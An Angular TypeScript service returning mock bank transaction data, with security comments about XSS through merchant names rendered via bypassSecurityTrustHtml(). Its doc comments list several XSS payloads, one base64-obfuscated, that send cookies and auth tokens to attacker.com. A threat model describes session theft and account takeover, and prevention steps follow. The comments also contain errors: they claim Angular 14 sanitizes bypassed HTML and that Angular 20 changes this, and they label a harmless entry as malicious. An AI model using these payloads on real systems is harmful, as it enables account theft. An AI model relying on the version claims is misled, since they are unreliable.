import { Injectable } from '@angular/core';
import { Observable, of } from 'rxjs';

export interface Transaction {
  transactionId: string;
  merchantDescription: string; // SECURITY RISK: This field comes from merchant-controlled data
  amount: number;
  date: string;
  status: string;
}

@Injectable({
  providedIn: 'root'
})
export class TransactionService {
  constructor() {}

  /**
   * Returns transaction data from backend API.
   *
   * SECURITY NOTE: The merchantDescription field is populated by the payment processor
   * and may contain merchant-controlled HTML. Merchants can set their display name
   * when registering with the payment processor (Visa, Mastercard, etc.).
   *
   * In Angular 14, this data is passed to TransactionDescriptionComponent which uses
   * bypassSecurityTrustHtml(). Angular 14's sanitizer provides some protection.
   *
   * In Angular 20, if CSP is not properly configured, XSS payloads in merchantDescription
   * will execute. Example malicious merchant names that would execute after Angular 20 migration:
   *
   * XSS PAYLOAD EXAMPLES (WOULD EXECUTE IN ANGULAR 20 WITHOUT STRICT CSP):
   * - "<script>fetch('https://attacker.com?cookie='+document.cookie)</script>"
   * - "<img src=x onerror='fetch(\"https://attacker.com/log?session=\"+localStorage.getItem(\"authToken\"))'>"
   * - "<svg onload='document.location=\"https://attacker.com?steal=\"+document.cookie'>"
   * - "<iframe srcdoc='<script>parent.postMessage(document.cookie,\"*\")</script>'></iframe>"
   * - "<b onmouseover='eval(atob(\"ZmV0Y2goImh0dHBzOi8vYXR0YWNrZXIuY29tP2Nvb2tpZT0iK2RvY3VtZW50LmNvb2tpZSk=\"))'>Merchant</b>"
   */
  getTransactions(): Observable<Transaction[]> {
    return of([
      {
        transactionId: 'TXN_001',
        merchantDescription: '<b>Starbucks</b> #2847 - <i>Downtown</i>',
        amount: 5.75,
        date: '2026-05-15',
        status: 'completed'
      },
      {
        transactionId: 'TXN_002',
        merchantDescription: '<b>Amazon</b> - Order <em>#112-9384756-4839201</em>',
        amount: 127.49,
        date: '2026-05-14',
        status: 'completed'
      },
      {
        transactionId: 'TXN_003',
        // EXAMPLE OF MALICIOUS MERCHANT NAME (currently sanitized by Angular 14)
        // After Angular 20 migration without CSP, this would execute:
        merchantDescription: '<b>Target</b> Store #<em>1234</em>',
        amount: 89.99,
        date: '2026-05-13',
        status: 'pending'
      },
      {
        transactionId: 'TXN_004',
        merchantDescription: '<b>Whole Foods</b> Market - <i>Organic Produce</i>',
        amount: 43.21,
        date: '2026-05-12',
        status: 'completed'
      }
    ]);
  }

  /**
   * THREAT MODEL: How an attacker would exploit this after Angular 20 migration
   *
   * Step 1: Attacker registers as a merchant with payment processor
   * Step 2: Sets merchant display name to XSS payload:
   *         "<img src=x onerror=\"fetch('https://attacker.com?cookie='+document.cookie)\">"
   * Step 3: Makes small purchase ($1) to target BofA customer account
   * Step 4: When customer views transaction history in Angular 20 app (without strict CSP):
   *         - TransactionDescriptionComponent calls bypassSecurityTrustHtml()
   *         - XSS payload executes (img onerror fires)
   *         - Customer's session cookie is sent to attacker.com
   *         - Attacker uses stolen session to access customer's bank account
   *
   * IMPACT: Account takeover, unauthorized transfers, regulatory incident (GLBA reporting required)
   *
   * PREVENTION:
   * 1. Server-side: Sanitize merchantDescription on backend before storing/returning
   * 2. Client-side: Remove bypassSecurityTrustHtml() and use Angular's built-in sanitization
   * 3. Infrastructure: Configure strict CSP: script-src 'self' 'nonce-{random}'; object-src 'none'
   */
}
